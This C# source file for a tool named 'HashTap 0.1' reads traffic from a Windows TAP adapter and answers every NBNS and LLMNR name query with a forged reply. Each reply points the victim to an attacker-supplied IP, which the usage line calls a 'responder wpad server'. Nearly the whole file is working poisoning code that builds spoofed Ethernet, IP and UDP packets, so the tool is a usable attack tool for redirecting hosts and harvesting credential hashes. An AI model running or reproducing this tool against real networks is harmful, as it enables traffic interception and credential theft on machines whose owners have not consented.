using System;
using System.IO;
using Microsoft.Win32;
using System.Threading;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Collections.Generic;

namespace TestTun
{
    class EtherField
    {
        public int offset = 0;
        public int length = 0;
        public EtherField(int i, int p)
        {
            offset = i;
            length = p;
        }

        public static EtherField SrcMac = new EtherField(0, 6);
        public static EtherField DstMac = new EtherField(6, 6);
        public static EtherField EtherType = new EtherField(12, 2);

        public static EtherField TCPProto = new EtherField(23, 1);

        public static EtherField IPSrc = new EtherField(26, 4);
        public static EtherField IPDst = new EtherField(30, 4);


        public static EtherField UDPSrcPort = new EtherField(34, 2);
        public static EtherField UDPDstPort = new EtherField(36, 2);

        //nbns
        public static EtherField NBNSQuestions = new EtherField(46, 2);
        public static EtherField NBNSQuestionStart = new EtherField(54, 33);
        public static EtherField NBNSTransId = new EtherField(42, 2);

        public static EtherField LLMNRTransId = new EtherField(42, 2);
        public static EtherField LLMNRFlags = new EtherField(44, 2);
        public static EtherField LLMNRNameLength = new EtherField(54, 1);
        public static EtherField LLMNRNameBytes = new EtherField(55, 0);
        //type and class are 2 bytes but variable pos due to name length






        public static byte[] GetField(byte[] buf, EtherField field)
        {
            return buf.Skip(field.offset).Take(field.length).ToArray();
        }
    }


    /// <summary>
    /// Summary description for Class1.
    /// </summary>
    class TunTap
    {

        static byte[] buf = new byte[10000];
        static int packetCount = 0;
        static String evilIP = "0.0.0.0";

        public static void PrintCoolScreen()
        {
            Console.Write(@"          
                                                                      XXXXXXXXXXXXXX
                                                                      XXXXXXXXXXXXXX
                                                                            XX
                                                                      XXXXXXXXXXX
                                                               XXXXXXXX         X
                                                              XX                X
                                                             XX    XXXXXXXX     X
                                                            X    XXX      X     X
                                                            X    X        X     X
                                                            X    X        X     X
                                                            XXXXXX        X     X
                                                                #         X     X
                                                            #             X     X
                                                               #         XX     XX
                                                                         XXXXXXXXX
                                                             #  #


          HashTap 0.1
--------------------------------------------------------------------------------------
");
        }

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            PrintCoolScreen();

            string devGuid = "{BA052E6C-053B-4276-976B-06C1E9DA3EAF}"; //
            if (args.Length >= 2) {
                devGuid = args[0];
                evilIP = args[1];

            } else
            {
                Console.WriteLine("ERROR: wrong args");
                Console.WriteLine("USAGE: tap.exe <deviceGUID> <IP of responder wpad server>");
                Environment.Exit(-1);
            }
            //attempt to open a handle to this device
            const string UsermodeDeviceSpace = "\\\\.\\Global\\";
            Console.WriteLine("> Starting with device guid: " + devGuid);
            IntPtr ptr = CreateFile(UsermodeDeviceSpace + devGuid + ".tap", FileAccess.ReadWrite,
                FileShare.ReadWrite, 0, FileMode.Open, FILE_ATTRIBUTE_SYSTEM | FILE_FLAG_OVERLAPPED, IntPtr.Zero);
            int len;
            IntPtr pstatus = Marshal.AllocHGlobal(4);
            Marshal.WriteInt32(pstatus, 1);
            DeviceIoControl(ptr, TAP_CONTROL_CODE(6, METHOD_BUFFERED) /* TAP_IOCTL_SET_MEDIA_STATUS */, pstatus, 4,
                    pstatus, 4, out len, IntPtr.Zero);
            IntPtr ptun = Marshal.AllocHGlobal(12);
            Marshal.WriteInt32(ptun, 0, 0x012cfea9);        //IP address
            Marshal.WriteInt32(ptun, 4, 0x002cfea9);        // subnet
            Marshal.WriteInt32(ptun, 8, unchecked((int)0x0000ffff)); //0x00ffffff - mask
            DeviceIoControl(ptr, TAP_CONTROL_CODE(10, METHOD_BUFFERED) /* TAP_IOCTL_CONFIG_TUN */, ptun, 12,
                ptun, 12, out len, IntPtr.Zero);
            Tap = new FileStream(ptr, FileAccess.ReadWrite, true, 10000, true);

            object state = new int();
            WaitObject = new EventWaitHandle(false, EventResetMode.AutoReset);
            object state2 = new int();
            WaitObject2 = new EventWaitHandle(false, EventResetMode.AutoReset);
            AsyncCallback readCallback = new
                AsyncCallback(ReadDataCallback);
            AsyncCallback writeCallback = new
                AsyncCallback(WriteDataCallback);
            IAsyncResult res, res2;
            Console.WriteLine("> Started listening...");
            while (true)
            {
                res = Tap.BeginRead(buf, 0, 10000, readCallback, state);
                WaitObject.WaitOne();

                // make sure this is an IPv4 frame
                byte[] etherType = EtherField.GetField(buf, EtherField.EtherType);
                if (etherType[0] == 8 && etherType[1] == 0)
                {
                    // is it UDP?
                    byte tcpType = (EtherField.GetField(buf, EtherField.TCPProto))[0];
                    if (tcpType == 0x11)
                    {
                        // look for interesting stuff based on the dest/src ports
                        byte[] ports = EtherField.GetField(buf, EtherField.UDPDstPort);
                        int DstPort = ports[0] << 8 | ports[1];
                        ports = EtherField.GetField(buf, EtherField.UDPSrcPort);
                        int SrcPort = ports[0] << 8 | ports[1];
                        if (SrcPort == 137 && DstPort == 137)
                        {
                            doNbnsSpoof(buf);           // spoof nbns response

                        }
                        else if (DstPort == 5355)
                        {
                            doLLMNRSpoof(buf);          // spoof LLMNR response
                        }
                    }
                }


            }
        }
        
        /// <summary>
        /// Spoof an llmnr response, sends back a forged packet aimed at the sender with the
        /// EvilIP as the response
        /// </summary>
        /// <param name="inPacket"></param>
        public static void doLLMNRSpoof(byte[] inPacket)
        {
            int nameLen = EtherField.GetField(inPacket, EtherField.LLMNRNameLength)[0];
            String name = System.Text.Encoding.Default.GetString(buf.Skip(EtherField.LLMNRNameBytes.offset).Take(nameLen).ToArray());

            byte[] srcMac = EtherField.GetField(inPacket, EtherField.SrcMac);
            byte[] dstMac = EtherField.GetField(inPacket, EtherField.DstMac);

            byte[] dstIP = EtherField.GetField(inPacket, EtherField.IPSrc);
            byte[] srcPort = EtherField.GetField(inPacket, EtherField.UDPSrcPort);
            int srcPortInt = ((int)srcPort[0] << 8) | (int)srcPort[1];

            Console.WriteLine("> Poisoning LLMNR request for " + name + " from IP: " + PrettyIp(dstIP));
            List<byte> responsePacket = GetEthernetFrame(srcMac, dstMac);
            responsePacket.AddRange(GetIPPacket(dstIP));
            responsePacket.AddRange(GetUDPHeader(5355, srcPortInt));

            responsePacket.AddRange(EtherField.GetField(inPacket, EtherField.LLMNRTransId));    //tid
            responsePacket.AddRange(new byte[] { 0x80, 0x00 });                                 //flags
            //                                  q           |rr         |auth      | otherrr
            responsePacket.AddRange(new byte[] { 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 });
            //add original query here
            byte[] originalQuery = inPacket.Skip(54).Take(nameLen + 2 + 2 + 2).ToArray();
            responsePacket.AddRange(originalQuery);
            //answers
            responsePacket.Add((byte)name.Length);
            responsePacket.AddRange(inPacket.Skip(EtherField.LLMNRNameBytes.offset).Take(nameLen).ToArray());
            responsePacket.Add(0x00);

            //answer types (A record, Hostname)
            responsePacket.AddRange(new byte[] { 0x00, 0x01, 0x00, 0x01 });
            //ttl
            responsePacket.AddRange(new byte[] { 0x00, 0x00, 0x00, 0x1e });
            //data
            responsePacket.AddRange(new byte[] { 0x00, 0x04 });
            // fake address
            foreach (String c in evilIP.Split('.'))
            {
                int v = Convert.ToInt32(c);
                byte b = Convert.ToByte(v);
                responsePacket.Add(b);
            }

            //update the IP length field (16 and 17)
            int len = responsePacket.Count - 14;
            byte lenUpper = (byte)(len >> 8);
            byte lenLower = (byte)len;
            responsePacket[16] = lenUpper;
            responsePacket[17] = lenLower;

            //and udp..
            len = responsePacket.Count - 34;
            lenUpper = (byte)(len >> 8);
            lenLower = (byte)len;
            responsePacket[38] = lenUpper;
            responsePacket[39] = lenLower;

            // update the IP checksum so windows doesnt drop the packet
            responsePacket = UpdateIPChecksum(responsePacket);

            // send it!
            IAsyncResult res2;
            WaitObject2 = new EventWaitHandle(false, EventResetMode.AutoReset);
            AsyncCallback writeCallback = new AsyncCallback(WriteDataCallback);
            object state2 = new int();
            res2 = Tap.BeginWrite(responsePacket.ToArray(), 0, responsePacket.Count, writeCallback, state2);
            WaitObject2.WaitOne();           
        }

        /// <summary>
        /// NBNS spoof, responds with an answer to a question but with EvilIP as the address
        /// </summary>
        /// <param name="inPacket"></param>
        public static void doNbnsSpoof(byte[] inPacket)
        {
            // read the query name, 32 bytes from questionstart
            String nameString = "";
            int nameLength = 0;
            byte[] bufTest = EtherField.GetField(inPacket, EtherField.NBNSQuestionStart);
            for (int i = 0; i < 32; i += 2)
            {
                // decode the name
                int nibbleUpper = bufTest[i + 1] - 0x41;
                int nibbleLower = bufTest[i + 2] - 0x41;
                nameString += Convert.ToChar(nibbleUpper << 4 | nibbleLower);
                nameLength = i;
            }
            byte[] srcMac = EtherField.GetField(inPacket, EtherField.SrcMac);
            byte[] dstMac = EtherField.GetField(inPacket, EtherField.DstMac);
            byte[] transId = EtherField.GetField(inPacket, EtherField.NBNSTransId);
            byte[] dstIP = EtherField.GetField(inPacket, EtherField.IPSrc);
            Console.WriteLine("> Poisoning NBNS response for " + nameString + " for client: " + PrettyIp(dstIP));

            // construct our data, ether frame -> IP -> udp -> nbns
            List<byte> responsePacket = GetEthernetFrame(srcMac, dstMac);
            responsePacket.AddRange(GetIPPacket(dstIP));
            responsePacket.AddRange(GetUDPHeader(137, 137));
            

            //now add the NBNS response
            //transction id
            responsePacket.Add(transId[0]);
            responsePacket.Add(transId[1]);
            //flags
            responsePacket.Add((byte)0x85);
            responsePacket.Add((byte)0x00);
            //questions
            responsePacket.Add((byte)0x00);
            responsePacket.Add((byte)0x00);
            //answers
            responsePacket.Add((byte)0x00);
            responsePacket.Add((byte)0x01);
            //auth rr
            responsePacket.Add((byte)0x00);
            responsePacket.Add((byte)0x00);
            //additional rr
            responsePacket.Add((byte)0x00);
            responsePacket.Add((byte)0x00);

            //original query name
            byte[] originalName = EtherField.GetField(buf, EtherField.NBNSQuestionStart);
            foreach (byte b in originalName)
            {
                responsePacket.Add(b);
            }
            responsePacket.Add(0x00);
            //original type
            responsePacket.Add(inPacket[88]);
            responsePacket.Add(inPacket[89]);

            // class
            responsePacket.Add(inPacket[90]);
            responsePacket.Add(inPacket[91]);

            //ttl
            responsePacket.Add((byte)0x00);
            responsePacket.Add((byte)0x00);
            responsePacket.Add((byte)0x00);
            responsePacket.Add((byte)0xe0);

            //data length
            responsePacket.Add((byte)0x00);
            responsePacket.Add((byte)0x06);
            //flags bnode?			
            responsePacket.Add((byte)0x00);
            responsePacket.Add((byte)0x00);

            // evil response address
            foreach (String c in evilIP.Split('.'))
            {
                int v = Convert.ToInt32(c);
                byte b = Convert.ToByte(v);
                responsePacket.Add(b);
            }

            //update the IP length field (16 and 17)
            int len = responsePacket.Count - 14;
            byte lenUpper = (byte)(len >> 8);
            byte lenLower = (byte)len;
            responsePacket[16] = lenUpper;
            responsePacket[17] = lenLower;

            //and udp..
            len = responsePacket.Count - 34;
            lenUpper = (byte)(len >> 8);
            lenLower = (byte)len;
            responsePacket[38] = lenUpper;
            responsePacket[39] = lenLower;

            //update checksum
            responsePacket = UpdateIPChecksum(responsePacket);
           
            IAsyncResult res2;
            WaitObject2 = new EventWaitHandle(false, EventResetMode.AutoReset);
            AsyncCallback writeCallback = new AsyncCallback(WriteDataCallback);
            object state2 = new int();
            res2 = Tap.BeginWrite(responsePacket.ToArray(), 0, responsePacket.Count, writeCallback, state2);
            WaitObject2.WaitOne();
        }

        /// <summary>
        /// Update the IP checksum field for a packet.
        /// </summary>
        /// <param name="packet">packet to checksum</param>
        /// <returns>completed packet</returns>
        private static List<byte> UpdateIPChecksum(List<byte> packet)
        {

            //sum ip header [14: 20]
            byte[] header = packet.Skip(14).Take(20).ToArray();
            int sum = 0;
            for (int i = 0; i < header.Length; i += 2)
            {
                int val = (int)header[i] << 8 | (int)header[i + 1];
                sum += val;
            }
            // magic.
            while ((sum >> 16) != 0)
            {
                sum = (sum & 0xFFFF) + (sum >> 16);
            }
            sum = ~sum;
            byte upper = (byte)(sum >> 8);
            byte lower = (byte)sum;
            packet[24] = upper;
            packet[25] = lower;
            return packet;
        }

        /// <summary>
        /// Construct a UDP header from a given source and dest port
        /// </summary>
        /// <param name="srcPort"></param>
        /// <param name="dstPort"></param>
        /// <returns></returns>
        private static List<byte> GetUDPHeader(int srcPort, int dstPort)
        {
            List<byte> responsePacket = new List<byte>();
            //UDP header
            //sourceport
            byte upper = (byte)(srcPort >> 8);
            byte lower = (byte)(srcPort);
            responsePacket.Add(upper);
            responsePacket.Add(lower);
            //destport
            upper = (byte)(dstPort >> 8);
            lower = (byte)(dstPort);
            responsePacket.Add(upper);
            responsePacket.Add(lower);
            //length (packet size - 34)
            responsePacket.Add(0x00);
            responsePacket.Add(0x00);
            //checksum
            responsePacket.Add(0x00);
            responsePacket.Add(0x00);

            return responsePacket;
        }

        /// <summary>
        /// Construct an ethernet frame from given src and dst mac
        /// </summary>
        /// <param name="srcMac"></param>
        /// <param name="dstMac"></param>
        /// <returns></returns>
        private static List<byte> GetEthernetFrame(byte[] srcMac, byte[] dstMac)
        {
            List<byte> responsePacket = new List<byte>();

            //construct ethernet frame first
            //dest mac
            foreach (byte b in dstMac)
            {
                responsePacket.Add(b);
            }
            //source mac
            byte[] ourMac = new byte[] { 0xDE, 0xAD, 0xBE, 0xEE, 0xEE, 0xEF };
            foreach (byte b in ourMac)
            {
                responsePacket.Add(b);
            }
            //ether type
            responsePacket.Add(0x08);
            responsePacket.Add(0x00);


            return responsePacket;
        }

        /// <summary>
        /// Construct an IP header with given dstAddress. Source address is assumed to be this interface
        /// </summary>
        /// <param name="dstAddress"></param>
        /// <returns></returns>
        private static List<byte> GetIPPacket(byte[] dstAddress)
        {
            List<byte> responsePacket = new List<byte>();
            //IP Header
            //version
            responsePacket.Add(0x45);
            //dscp
            responsePacket.Add(0x00);
            //length - to be added later (len of packet - 14)
            responsePacket.Add(0x00);
            responsePacket.Add(0x00);
            //ID
            responsePacket.Add(0xea);
            responsePacket.Add(0x66);
            //flags
            responsePacket.Add(0x40);
            //offset
            responsePacket.Add(0x00);
            //ttl
            responsePacket.Add(0x40);
            //proto
            responsePacket.Add(0x11);
            //checksum
            responsePacket.Add(0x00);
            responsePacket.Add(0x00);

            //source
            String srcIP = "169.254.44.1";
            foreach (String c in srcIP.Split('.'))
            {
                int v = Convert.ToInt32(c);
                byte b = Convert.ToByte(v);
                responsePacket.Add(b);
            }
            //dest
            //make this the same as the original source
            //buf [26:29]

            foreach (byte b in dstAddress)
            {
                responsePacket.Add(b);
            }
            return responsePacket;

        }

        /// <summary>
        /// prettyfy an IP address from a byte array
        /// </summary>
        /// <param name="ip"></param>
        /// <returns></returns>
        private static String PrettyIp(byte[] ip)
        {
            return (int)ip[0] + "." + (int)ip[1] + "." + (int)ip[2] + "." + (int)ip[3];
        }

        public static void WriteDataCallback(IAsyncResult asyncResult)
        {
            Tap.EndWrite(asyncResult);
            WaitObject2.Set();
        }

        public static void ReadDataCallback(IAsyncResult asyncResult)
        {
            BytesRead = Tap.EndRead(asyncResult);

            WaitObject.Set();
        }


        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 3);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2} ", b);
            return hex.ToString();
        }


        #region MAGIC STUFF

        private static uint CTL_CODE(uint DeviceType, uint Function, uint Method, uint Access)
        {
            return ((DeviceType << 16) | (Access << 14) | (Function << 2) | Method);
        }

        static uint TAP_CONTROL_CODE(uint request, uint method)
        {
            return CTL_CODE(FILE_DEVICE_UNKNOWN, request, method, FILE_ANY_ACCESS);
        }
        private const uint METHOD_BUFFERED = 0;
        private const uint FILE_ANY_ACCESS = 0;
        private const uint FILE_DEVICE_UNKNOWN = 0x00000022;

        static FileStream Tap;
        static EventWaitHandle WaitObject, WaitObject2;
        static int BytesRead;

        [DllImport("Kernel32.dll", /* ExactSpelling = true, */ SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr CreateFile(
            string filename,
            [MarshalAs(UnmanagedType.U4)]FileAccess fileaccess,
            [MarshalAs(UnmanagedType.U4)]FileShare fileshare,
            int securityattributes,
            [MarshalAs(UnmanagedType.U4)]FileMode creationdisposition,
            int flags,
            IntPtr template);
        const int FILE_ATTRIBUTE_SYSTEM = 0x4;
        const int FILE_FLAG_OVERLAPPED = 0x40000000;

        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode,
            IntPtr lpInBuffer, uint nInBufferSize,
            IntPtr lpOutBuffer, uint nOutBufferSize,
            out int lpBytesReturned, IntPtr lpOverlapped);

    }

    #endregion
}
